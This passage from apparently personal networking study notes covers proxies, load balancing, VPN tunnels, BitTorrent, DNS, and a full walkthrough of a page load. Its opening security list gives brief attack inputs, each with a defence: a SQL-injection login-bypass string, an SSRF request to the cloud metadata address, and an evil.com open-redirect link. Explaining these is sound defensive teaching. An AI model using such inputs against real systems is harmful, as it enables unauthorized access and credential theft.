  - Defense: `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`), older `X-Frame-Options: DENY`/`SAMEORIGIN`
- **Other common attacks** (worth knowing):
  - **SQL Injection**: user input concatenated into a SQL query; `' OR '1'='1` → login bypass, data dump; defense: parameterized queries / ORM, never string-concatenate SQL
  - **SSRF (Server-Side Request Forgery)**: app fetches a user-given URL from the server, attacker makes it hit internal services (`http://169.254.169.254` cloud metadata → credentials); defense: allowlist destinations, block internal IP ranges
  - **MITM (Man-in-the-Middle)**: attacker sits between client & server (public Wi-Fi, ARP spoofing) to read/modify traffic; defense: HTTPS everywhere, HSTS, proper certificate validation
  - **DNS spoofing**: fake DNS answers send users to the attacker's server; defense: HTTPS (cert won't match), DNSSEC
  - **DDoS (Distributed Denial of Service)**: flood a service with traffic from many machines until it can't serve real users; defense: CDN/WAF (Cloudflare etc.), rate limiting, autoscaling
  - **Open redirect**: `site.com/login?next=https://evil.com` redirects anywhere; used in phishing since the link starts with a trusted domain; defense: allow only relative/allowlisted redirect URLs

## 13. Proxy & Network Infrastructure
- **Proxy**: intermediary between a client and another server; instead of talking directly to the destination, the client talks through the proxy, which forwards the request and relays the response
- **Forward Proxy**: sits in front of **clients** and talks to the internet on their behalf; destination sees the proxy's IP, not the client's
  - Used for: company/school web filtering, logging, caching, hiding client IP, getting around geo-restrictions (VPN-like)
- **Reverse Proxy**: sits in front of **servers**; clients talk to the proxy thinking it's the server; proxy decides which backend handles the request
  - Used for: load balancing, TLS termination, routing (`/api` → API servers, `/` → frontend), caching, compression, rate limiting, hiding backend servers
- **Forward vs Reverse**: forward proxy hides/acts for the **client**; reverse proxy hides/acts for the **server**

```
Forward:  [Clients] → Forward Proxy → Internet → Server
Reverse:  Client → Internet → Reverse Proxy → [Server 1, Server 2, Server 3]
```

- **Nginx**: web server widely used as a reverse proxy, TLS terminator, load balancer, and static file server; alternatives: HAProxy, Envoy, Traefik, Caddy
- **TLS termination**: client's HTTPS connection ends (gets decrypted) at the reverse proxy/load balancer; proxy talks plain HTTP (or new TLS) to the backend
  - Why: proxy can read HTTP paths/headers to route requests and apply rules; certificates managed in one place; backends don't spend CPU on TLS
  - **TLS passthrough**: proxy forwards encrypted traffic as-is (L4); backend handles TLS; proxy can't see HTTP
  - **Re-encryption**: terminate at proxy, then open new TLS to backend; used when internal traffic must also be encrypted (zero-trust, compliance)
- **X-Forwarded-For / X-Forwarded-Proto**: behind a proxy, the backend sees the **proxy's IP** as the client and plain HTTP as the scheme; proxy adds these headers with the real client IP and original scheme (`https`)
  - Only trust them when set by your own proxy; clients can fake them
- **Load Balancer**: distributes incoming traffic across multiple backend instances instead of sending every request to one server; gives scalability (add more instances) and availability (one dies, others keep serving)
- **L4 Load Balancing**: decides based on IP addresses and ports only (Transport layer); doesn't look inside the data
  - Fast, works for any TCP/UDP traffic (databases, raw TCP services, game servers); can't route by URL or header
  - e.g. AWS NLB, HAProxy (TCP mode)
- **L7 Load Balancing**: reads the HTTP request; routes using hostnames, paths, headers, cookies
  - e.g. `api.example.com` → API service, `/images/*` → image service; can also retry, rewrite, add headers
  - More CPU (must terminate TLS and parse HTTP); e.g. AWS ALB, Nginx, Envoy
- **Load balancing algorithms**:
  - **Round robin**: one by one in order; simple, default
  - **Weighted round robin**: bigger servers get more traffic
  - **Least connections**: send to the instance with fewest active connections; good for long/uneven requests
  - **IP hash / consistent hashing**: same client (or key) → same instance
- **Health checks**: load balancer regularly calls each instance (e.g. `GET /health` every 10s) and stops sending traffic to instances that fail; adds them back when they pass again
  - **Liveness**: is the process alive? (if not → restart it)
  - **Readiness**: can it serve traffic right now? (DB connected, warmed up; if not → don't send traffic, but don't restart)
  - Keep `/health` cheap; if it deeply checks a shared DB, a DB blip marks **every** instance unhealthy at once
- **Connection draining**: when removing an instance (deploy, scale down), LB stops sending new requests but lets in-flight requests finish; enables zero-downtime deploys
- **Sticky Sessions**: load balancer sends a client back to the same backend instance across requests (via a cookie or IP hash)
  - Needed when session data is stored in that server's memory
  - Downsides: uneven load, sessions lost if that instance dies, harder scaling
  - Better: keep app servers **stateless** and store sessions in a shared store (Redis/DB) or use tokens
- **API Gateway**: reverse proxy specialized for APIs; single entry point for many backend services; handles auth, rate limiting, request validation, routing, API keys; e.g. Kong, AWS API Gateway
- **CDN (Content Delivery Network)**: network of servers around the world (edge locations) that cache your content close to users
  - User in India gets the file from a Mumbai edge instead of a US server → lower latency, less load on your origin server
  - Caches static files (images, JS, CSS, videos); can also do TLS, DDoS protection, WAF; e.g. Cloudflare, CloudFront, Akamai
  - Controlled via `Cache-Control` headers; after deploy, **cache invalidation** or versioned file names (`app.3f9a2.js`)

## 14. VPN
### What it is
A VPN (Virtual Private Network) creates an encrypted **tunnel** between your device and a VPN server. Your traffic goes through that server instead of directly to the internet.

**Tunnel = encapsulation + encryption**
- **Encapsulation:** your packet is put inside a new packet addressed to the VPN server
- **Encryption:** the inner packet is scrambled so nobody in between can read it

### Without a VPN
- Every packet has a header: `From: your IP → To: destination IP`
- The header must stay readable so routers know where to send it
- So your ISP (and everyone in between) can see **who** you talk to, even if HTTPS hides **what** you send
- Domain names also leak through **DNS queries** and the **SNI** in the TLS ClientHello

### With a VPN (step by step)
1. VPN app connects to a VPN server (e.g. USA) → **handshake** → both agree on a secret key
2. VPN app creates a **virtual network card** (`tun0`, `wg0`) and gets a VPN IP (e.g. `10.8.0.12`); the OS routing table is changed so traffic goes into it (all traffic, or only some → see split tunneling)
3. Your app makes a normal packet: `From: 10.8.0.12 → To: netflix.com`
4. VPN app **encrypts the whole packet** (header + data) and wraps it in a new UDP/IP packet: `From: your IP → To: VPN server IP`
5. ISP sees only the outer header (your IP → VPN IP); the rest is gibberish
6. VPN server unwraps and decrypts it → gets the original packet
7. **NATs** it: replaces the VPN IP (`10.8.0.12`) with **its own public IP** and forwards it → the site sees the VPN's IP
8. Reply: site → VPN server → encrypted → back to you → VPN app decrypts → gives the real packet to your app

All of this happens in **software**: the VPN app on your device and the VPN server on the other end.

### Company VPN (private network access)
- Internal tools (DB, Jira, wiki) use **private IPs** (`10.x.x.x`, `192.168.x.x`) → unreachable from the internet
- The office **VPN server** is the only door: it has a public IP and is also connected to the private network
- Same tunnel as a normal VPN, only the **exit** differs:
  - Normal VPN → traffic exits **out** to the public internet
  - Company VPN → traffic exits **into** the private office network
- You get an internal IP (e.g. `10.8.0.12`), so internal servers treat you like you're in the office
- **Split tunneling:** often only office traffic (`10.x`) goes through the VPN; the rest uses your normal internet (**full tunnel** = everything goes through the VPN)
- Auth is strict: password + MFA, often a device certificate (company laptops only)
- **Site-to-site VPN:** the same idea between whole networks (office ↔ office, office ↔ cloud VPC); routers/gateways at both ends keep the tunnel up, so devices don't run any VPN app

### Handshake (OpenVPN / TLS 1.3 style)
1. **Client hello** + ECDHE public key (+ random number, supported ciphers)
2. **Server hello** + ECDHE public key (+ chosen cipher)
3. Both compute the **same shared secret** → derive keys → everything after this is encrypted
4. Server sends **certificate + signature + Finished**
   - The signature covers the whole handshake so far → proves it's the real server → stops man-in-the-middle
5. Client verifies them and sends **Finished** (+ its own certificate if required)
6. **Username, password, MFA** (company VPN) → sent inside the encrypted channel
7. **Login OK**
8. Server pushes **config**: your VPN IP, routes, DNS
9. **Encrypted data** flows using fast symmetric encryption (AES-GCM / ChaCha20)
10. Keys are **refreshed periodically** (rekeying)

ECDHE keys are temporary → **forward secrecy**: if the server's key leaks later, past sessions stay safe.

Same idea as the TLS handshake in section 10. WireGuard is simpler: a 1-RTT handshake with pre-shared public keys, no certificates, and no username/password step.

### VPN protocols
- **WireGuard:** modern, small codebase, fast, UDP only; each peer has a public/private key pair (no certificates); basis of Tailscale
- **OpenVPN:** older, uses TLS for the handshake; works over UDP or TCP; over TCP port 443 it usually gets through strict firewalls (though it can still be detected), but TCP-inside-TCP is slower; very flexible
- **IPsec + IKEv2:** IKEv2 does the handshake, IPsec encrypts packets at the IP layer; built into OSes, routers and cloud VPN gateways; common for site-to-site (office ↔ office / cloud)

### What a VPN does NOT do
- Not anonymity: the VPN provider can see everything your ISP used to see (you just move your trust to the provider)
- Doesn't protect against malware, phishing, or tracking via cookies/logins
- **DNS leak:** if DNS queries skip the tunnel, your ISP still sees every domain you visit

## 15. Peer-to-Peer & BitTorrent
### Client-server vs P2P
- **Client-server:** everyone downloads from one server → more users = more load → slower for everyone
- **Peer-to-peer (P2P):** every participant is both client and server; peers download from each other → more users = more upload capacity → popular files get **faster**

### BitTorrent
The most popular P2P file-sharing protocol. Two core ideas:
1. **Chop the file into small pieces** (usually 256 KB to a few MB each)
2. **Everyone who is downloading also uploads** the pieces they already have

So you download different pieces from dozens of people at the same time, and they download pieces from you.

### Key terms
- **Piece:** a fixed-size chunk of the file; each piece is downloaded and verified independently
- **Piece hash:** fingerprint of each piece (SHA-1, or SHA-256 in BitTorrent v2); used to check every downloaded piece
- **Peer:** anyone in the swarm sharing this torrent (seeders + leechers)
- **Seeder:** peer with the complete file; only uploads
- **Leecher:** peer still downloading; also uploads the pieces it has
- **Swarm:** all peers sharing one torrent
- **Tracker:** server that keeps a list of peers (IP + port) in a swarm; it does **not** have the file
- **Ratio:** uploaded ÷ downloaded
- **Availability:** how many full copies exist among online peers; below 1.0 = some piece is missing from the swarm

### .torrent file, info hash, magnet link
- **.torrent file:** a small "recipe", not the actual file. Contains file names, sizes, piece size, tracker address (optional) and the **hash of every piece**
- **Info hash:** hash of the torrent's info section → unique ID of the torrent
- **Magnet link:** just the info hash as a link (`magnet:?xt=urn:btih:...`); the client finds peers first, then downloads the recipe from them

### How a download works (step by step)
1. Open the .torrent / magnet link → client reads the info hash and piece hashes
2. **Find peers** using:
   - **Tracker:** "who has this info hash?" → list of IPs
   - **DHT (Distributed Hash Table):** every client acts as part of a giant shared phonebook (no central server)
   - **PEX (Peer Exchange):** connected peers share the peers they know
3. **Connect** to peers (TCP or uTP) → handshake includes the info hash (mismatch = disconnect)
4. Peers exchange a **bitfield** → a checklist of which pieces each one has
5. **Request different pieces from different peers** at the same time (each piece is fetched in small ~16 KB blocks)
6. **Verify** each piece by hashing it and comparing with the .torrent → mismatch = discard and re-download (so you never need to trust peers)
7. Tell peers "I have piece X" and **start uploading it**
8. All pieces verified → file is assembled → you become a **seeder**

### Rules that keep it working
- **Rarest first:** download the piece the fewest peers have, so rare pieces don't disappear
- **Tit-for-tat:** upload mostly to peers who upload the most back to you; others are "choked"
- **Optimistic unchoke:** every ~30 s, upload to one random peer → helps newcomers get started and finds faster peers
- **Endgame mode:** for the last few pieces, request them from everyone at once (and cancel the duplicates) → no getting stuck at 99.9%

### Networking details
- **Transport:** TCP, or **uTP** (runs over UDP and backs off when other traffic on your network needs bandwidth → torrents don't slow down your browsing)
- **NAT problem:** peers behind NAT (section 2) can't accept incoming connections by default
  - Clients use **UPnP / NAT-PMP** to auto-open a port on your router, or you set up **port forwarding** manually
  - Behind **CGNAT** you can only make outgoing connections → fewer peers → slower
  - Two peers both behind NAT can sometimes still connect via **hole punching** (both sides connect out to each other at the same time, with a third server helping them find each other's public IP:port)

### Weaknesses
- **Hit and run:** many people stop seeding once done; nothing in the protocol forces them to keep seeding
- **Needs someone online:** you need peers online at the same time who have the pieces
  - One seeder is enough (just slower)
  - No seeder is fine too if leechers **together** have every piece
  - Availability < 1.0 → download gets stuck until someone with the missing piece comes back
- **Dead torrent:** no complete copy left in the swarm → can never finish
- Great for **popular** files, bad for **rare/old** ones

### Why seeders exist
- Clients keep seeding by default after finishing; many people leave them running in the background
- **Private trackers** enforce a minimum ratio, or you get banned
- **Official seeders:** organizations (Linux distros, Internet Archive) seed 24/7
- Some people seed just to give back
- **Web seeds:** a torrent can include a normal HTTP link as a backup seeder → works even with zero peers online

### Privacy & legality
- Every peer in the swarm can see your **IP** and which torrent you're in (they need it to send you data)
- Anti-piracy companies join swarms to collect IPs → that's why people use a VPN with torrents (peers see the VPN's IP)
- The technology is legal and widely used (Linux ISOs, Internet Archive, game updates); sharing copyrighted content without permission is illegal in most countries, including India

## 16. DNS
> I've written a detailed post on this: [How DNS Really Works: From Browser Cache to ISP Tracking](/blogs/how-dns-really-works). It covers resolution step by step, propagation, negative caching, ISP tracking, and DNS leaks. Below is the quick reference.

- **DNS (Domain Name System)**: the internet's phonebook; translates human-readable names (`google.com`) into IP addresses (`142.250.1.1`); runs mostly over **UDP port 53** (TCP for large responses/zone transfers)
- **Resolution flow**: browser cache → OS cache (+ `/etc/hosts`) → **recursive resolver** (ISP, `8.8.8.8`, `1.1.1.1`) → **root server** → **TLD server** (`.com`) → **authoritative server** (has the actual record) → answer cached at every step on the way back
- **Recursive resolver**: does the full lookup on your behalf and caches results
- **Authoritative name server**: source of truth for a domain's records (where you edit DNS: Cloudflare, Route 53, your registrar)
- **Common records**:
  - **A**: name → IPv4
  - **AAAA**: name → IPv6
  - **CNAME**: name → another name (alias); can't be used on the root domain (`example.com`)
  - **MX**: mail servers for the domain
  - **TXT**: free text; used for domain verification, SPF/DKIM email auth
  - **NS**: which name servers are authoritative for the domain
- **TTL (Time To Live)**: how long (in seconds) resolvers can cache a record; low TTL = changes spread faster but more lookups; lower it **before** a migration
- **DNS propagation**: not really "propagating"; old answers stay in caches until their TTL expires
- **`/etc/hosts`**: local file mapping names to IPs; checked before DNS; handy for local testing (`127.0.0.1 myapp.local`)
- **DoH / DoT (DNS over HTTPS / TLS)**: encrypt DNS queries so the local network/ISP can't read or tamper with them
- **Engineer notes**:
  - "It's always DNS": wrong record, stale cache, or wrong resolver is behind many "the server is down" incidents
  - Inside Docker/K8s, names like `db` or `my-svc.default.svc.cluster.local` are resolved by the internal DNS server, not public DNS
  - Debug: `dig example.com`, `dig +short example.com A`, `dig @1.1.1.1 example.com` (ask a specific resolver), `nslookup example.com`

## 17. Putting It All Together: From Home Router to Web Page
- Everything from the sections above, in one journey: your home network connects to the ISP → your laptop joins Wi-Fi → you open `https://example.com` → the page shows up
- Example values used below:
  - Laptop: private IP `192.168.1.23`, MAC `aa:aa:aa:aa:aa:aa`
  - Home router: LAN IP `192.168.1.1`, MAC `bb:bb:bb:bb:bb:bb`, public IP `198.51.100.7`
  - `example.com` server: `203.0.113.10`

### Part 1: Your home router & the ISP
- **The "router" box at home** is actually many devices in one:
  - **Modem / ONT**: converts the ISP's line signal (fiber light / DSL / cable) into Ethernet (L1)
  - **Router**: connects your home LAN (`192.168.1.0/24`) to the ISP's network; it's your **default gateway** (L3)
  - **NAT**: lets all home devices share the one public IP the ISP gives the router
  - **Switch**: LAN ports, forwards frames by MAC (L2)
  - **Access Point**: Wi-Fi radio, bridges wireless devices into the same LAN
  - **DHCP server**: hands out private IPs to your devices
  - **DNS forwarder**: answers/forwards DNS queries for your devices (often advertises itself, `192.168.1.1`, as the DNS server)
  - **Firewall**: blocks unsolicited inbound connections (NAT already does this mostly)
- **When the router boots and connects to the ISP**:
  1. Physical link comes up to the ISP's equipment (fiber to the ISP's OLT, DSL to the exchange, etc.)
  2. Router authenticates with the ISP (commonly **PPPoE** with a username/password, or DHCP/IPoE based on the line/MAC)
  3. ISP assigns the router's **WAN side**: a public IP (`198.51.100.7`) or a CGNAT IP (`100.64.x.x` range), ISP's DNS servers, and the ISP's gateway as the router's default gateway
  4. Now the router has two sides: **LAN** (private, `192.168.1.1`) and **WAN** (ISP-facing, `198.51.100.7`)
- **What the ISP does**:
  - Gives you access: connects many homes in an area into its network and assigns IPs (public, or shared via CGNAT)
  - Routes your traffic: ISP's network is an **Autonomous System (AS)**; it uses **BGP** to exchange routes with other networks ("I can reach these IP ranges")
  - Connects to the rest of the internet: through **transit** (paying bigger networks) and **peering** (direct exchange with other networks, often at **IXPs - Internet Exchange Points**); traffic to big services (Google, Netflix, Cloudflare) often stays within the country via peering or caches inside the ISP
  - Runs DNS resolvers that your router uses by default
  - The "internet" is just thousands of these networks (ISPs, clouds, CDNs, universities) connected together and agreeing via BGP on how to reach each other

### Part 2: Your laptop joins the network
1. **Wi-Fi connect (L1/L2)**: laptop finds the network (SSID), authenticates with the password (WPA2/WPA3), and both sides derive encryption keys for the Wi-Fi link; laptop now can send frames, but has **no IP yet**
2. **DHCP (getting an IP)** - 4 steps, **DORA**:
   - **Discover**: laptop broadcasts "any DHCP server here?" (src IP `0.0.0.0`, dst `255.255.255.255`, dst MAC `ff:ff:ff:ff:ff:ff`); it has no IP yet, so it can only identify itself by its MAC
   - **Offer**: router offers `192.168.1.23`
   - **Request**: laptop says "I'll take `192.168.1.23`"
   - **Ack**: router confirms + sends config: subnet mask `255.255.255.0`, default gateway `192.168.1.1`, DNS server `192.168.1.1`, **lease time** (e.g. 24h; renewed before expiry)
3. **ARP for the gateway**: laptop asks "who has `192.168.1.1`?" → router replies with MAC `bb:bb:bb:bb:bb:bb`; cached in the ARP table
4. Laptop is now **online**: it knows its IP, its network (`/24`), where to send outside traffic (gateway), and whom to ask for DNS

### Part 3: You type `example.com` and press Enter
1. **Browser parses the input**:
   - Is it a URL or a search term? `example.com` looks like a domain → URL
   - No scheme typed → modern browsers try `https://` first; HSTS sites are always upgraded to `https://` (older behavior: try `http://`, get a 301 redirect to `https://`)
   - Checks its **HTTP cache** (fresh cached page? → done, no network) and whether it already has an open connection to this origin to reuse
2. **DNS lookup** (`example.com` → IP):
   - Browser DNS cache → OS DNS cache → `/etc/hosts` → not found
   - OS sends a DNS query over **UDP** to the DNS server from DHCP: `192.168.1.23:53000 → 192.168.1.1:53`
   - Router forwards it to the ISP resolver (or `1.1.1.1`/`8.8.8.8` if configured) → resolver checks its cache, otherwise asks **root** → **`.com` TLD** → **example.com's authoritative server**
   - Answer: `A example.com → 203.0.113.10`, TTL 3600; cached by resolver, OS, and browser
   - Note: this DNS packet itself goes through the same NAT/routing journey described below
3. **Routing decision on the laptop**:
   - Is `203.0.113.10` inside my network `192.168.1.0/24`? **No** → send it to the **default gateway** `192.168.1.1`
   - Gateway's MAC is already in the ARP cache (`bb:bb:...`)
4. **TCP connection (3-way handshake)**:
   - Browser asks OS for a socket and calls `connect(203.0.113.10:443)`; OS picks an **ephemeral port**, say `54321`
   - OS builds the **SYN**, encapsulating at each layer:

```
L4 TCP:   [ src port 54321 | dst port 443 | SYN ]
L3 IP:    [ src 192.168.1.23 | dst 203.0.113.10 | TTL 64 ] + TCP
L2 Wi-Fi: [ src MAC aa:aa:.. | dst MAC bb:bb:.. (router!) ] + IP + TCP
L1:       radio signal
```

   - Note the dst MAC is the **router's**, while the dst IP is the **server's** (hop-to-hop vs end-to-end)
5. **At the home router**:
   - Receives the frame (its MAC) → strips the L2 header → reads the IP header → destination is outside → route to the ISP
   - **NAT**: rewrites `src 192.168.1.23:54321` → `198.51.100.7:40001` and saves the mapping in its **NAT table** (so replies can be sent back to the laptop)
   - Decrements TTL, wraps the packet in a new L2 frame for the ISP link, sends it
   - (If behind CGNAT, the ISP does a second NAT the same way)
6. **Across the internet**:
   - Each router (hop) looks at the destination IP, checks its routing table (built using BGP between networks), picks the next hop, **decrements TTL**, rewrites the L2 header, and forwards
   - Source & destination **IP stay the same** the whole way (after NAT); MACs change at every hop
   - Usually 10-20 hops; `traceroute example.com` shows them
   - Often the "server" is actually the nearest **CDN edge**, not the origin server across the world (anycast IPs route you to the closest one)
7. **SYN-ACK & ACK**: server replies `203.0.113.10:443 → 198.51.100.7:40001`; home router finds `40001` in its NAT table → rewrites dst to `192.168.1.23:54321` → delivers to the laptop by MAC; laptop sends **ACK** → **TCP connection established** (1 RTT)
8. **TLS 1.3 handshake** (section 10, 1 RTT):
   - **ClientHello**: TLS versions, cipher suites, key share, **SNI** = `example.com`, **ALPN** = `h2, http/1.1`
   - **ServerHello**: chosen cipher + server key share → both compute the shared secret; everything after is encrypted
   - **Certificate**: server (using SNI to pick the right one) sends its **leaf certificate** for `example.com` + **intermediate CA** certificate
   - **CertificateVerify**: server signs the handshake so far with the certificate's **private key** → proves it owns the certificate (not just a copy) and that the key share wasn't swapped by a man-in-the-middle
   - **Certificate validation** in the browser:
     - **Hostname**: `example.com` is in the certificate's SAN list
     - **Validity**: current date is between "not before" and "not after"
     - **Chain of trust**: leaf is signed by the intermediate, intermediate is signed by a **root CA** already in the OS/browser **root store**; each signature checked with the issuer's public key
     - **Usage**: certificate is allowed for TLS server authentication
     - **Revocation**: not revoked (CRL/OCSP)
     - **CertificateVerify signature**: valid with the public key from the certificate
     - Any check fails → connection stops, browser shows "Your connection is not private" (HSTS sites don't even allow clicking through)
   - **Finished** from both sides (HMAC over the whole handshake → nothing was tampered with); both derive the final **traffic keys**
   - ALPN picked `h2` → this connection will speak HTTP/2
9. **HTTP request**:
   - `GET / HTTP/2` with headers: `Host`/`:authority: example.com`, `User-Agent`, `Accept`, `Accept-Encoding`, cookies for this site (respecting `Secure`/`SameSite`)
   - Encrypted by TLS → split into TCP segments → IP packets → frames → same path as above
10. **Server side**:
    - **CDN edge**: cached copy? → respond immediately; otherwise forward to origin
    - **Load balancer** (L7, TLS termination): picks a healthy instance (health checks), adds `X-Forwarded-For` with the client's IP
    - **Reverse proxy** (Nginx) → forwards to the app server (often running in a container)
    - App runs the handler: maybe reads a DB/cache over the internal network (by service name via internal DNS)
    - Response: `200 OK`, `Content-Type: text/html`, `Cache-Control`, `Set-Cookie`, security headers (HSTS, CSP), body
11. **Response travels back**:
    - Same path in reverse; NAT translates it back at your router
    - TCP handles it reliably: **sequence numbers** to order segments, **ACKs**, **retransmission** of lost packets, **flow control** & **congestion control** (slow start ramps up the speed)
    - TLS decrypts and verifies integrity → browser gets the HTTP response
12. **Browser renders the page**:
    - Parses HTML → finds CSS, JS, images, fonts
    - Same-origin resources → reuse the same HTTP/2 connection (**multiplexed** streams, no new handshakes)
    - Other domains (CDN, fonts, analytics) → each needs its own **DNS + TCP + TLS** (or QUIC for HTTP/3)
    - JS `fetch` to an API on another origin → **CORS** checks (maybe a preflight `OPTIONS`)
    - `Set-Cookie` stored → sent on future requests
    - Live features (chat, notifications) may open a long-lived **WebSocket** connection (`101 Switching Protocols`)
13. **Afterwards**:
    - Connection stays open (keep-alive) for more requests; closed after idling → **FIN/ACK**; the side that closes first sits in **TIME_WAIT**
    - DNS, HTTP cache, TLS session ticket are all cached → next visit skips most of these steps (0-RTT resumption possible)

### Summary
```
Power on router  → ISP link + auth (PPPoE/DHCP) → router gets public IP
Join Wi-Fi       → WPA2/3 auth → DHCP (DORA) → ARP for gateway
Type URL         → HSTS / cache check
DNS              → browser → OS → router → resolver → root → TLD → authoritative → IP
TCP              → SYN / SYN-ACK / ACK            (1 RTT)
TLS              → ClientHello / ServerHello → certificate chain + CertificateVerify → browser validates cert → Finished  (1 RTT)
HTTP             → GET / → CDN → LB → proxy → app → DB → 200 OK
Each packet      → encapsulated L7→L1 → NAT at home router → hops via BGP routes → decapsulated at server
Render           → more requests (multiplexed) → CORS / cookies / WebSocket as needed
```

## 18. What to Do Next
1. **Observe real traffic**: capture in Wireshark while you reconnect Wi-Fi (DHCP DORA), open a site (DNS query, TCP 3-way handshake, TLS ClientHello with SNI), and close it (FIN/ACK); run `dig +trace example.com`, `traceroute example.com`, `curl -v https://example.com`; inspect a site's certificate chain in the browser
2. **TCP & UDP client/server**: echo server with raw sockets in both, then turn the TCP one into a multi-client chat server
3. **HTTP/1.1 server from scratch**: on top of raw TCP sockets; parse the request line, headers, and body yourself, serve static files, return proper status codes, support keep-alive
4. **DNS resolver from scratch**: build a DNS query packet by hand, send it over UDP to a root server, and follow referrals (root → TLD → authoritative) until you get the IP
5. **Reverse proxy / load balancer**: forward requests to multiple backends with round robin, health checks, and `X-Forwarded-For`

**Resources**
- [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/): sockets from scratch; perfect companion for projects 2 & 3
- [Julia Evans - How DNS Works (zine)](https://wizardzines.com/zines/dns/): short, visual, and fun intro to DNS
